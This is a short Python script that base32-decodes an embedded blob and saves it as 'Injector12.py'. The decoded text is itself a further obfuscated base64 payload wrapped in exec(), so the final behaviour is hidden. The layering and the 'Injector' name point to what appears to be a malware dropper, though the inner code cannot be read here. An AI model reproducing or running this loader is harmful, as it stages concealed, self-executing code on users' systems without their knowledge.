
import base64

obs = r'MV4GKYZIMNXWIZLDOMXGIZLDN5SGKKDCMFZWKNRUFZRDMNDEMVRW6ZDFFBZCOWBRHFMFEVKKJFKDAOKMLAYGQRSVNNLGMWDZIE4USQ2KN5SEQUTXMN5G65SMGJJHAYZSJZ3GG3KROVMTEOLUJQZEM53BKM4TGWSXJJXWEMRZOJRXSODYJVCFCNCOIRTXQTL2IE2U6VCVGFGWUQJTJVKFSNCMGJLHMWKYLI3FORKKKBITA3ZQLJWXIU3DGFUFMUTNKJUWIVCNORJWUYZRMVVXQTDCI5FDAY3LKZCFE2ZRKBJFIRTMMEYVMWCSNRNG2T2UJJ4VEMKCGJKEQSRWKNLVU6KMKRDHMWSEIJEGKVDENNEWOPJ5E4USSKI='

# Decompress the obfuscated code
decode1 = base64.b32decode(obs)

# Decode the decompressed code
decoded_code = decode1.decode()

# Now you have the decoded and decompressed code available in the `decoded_code` variable

# Save the decompressed code to a file
output_file = "Injector12.py"  # Specify the desired output file name

with open(output_file, "w") as file:
    file.write(decoded_code)
    
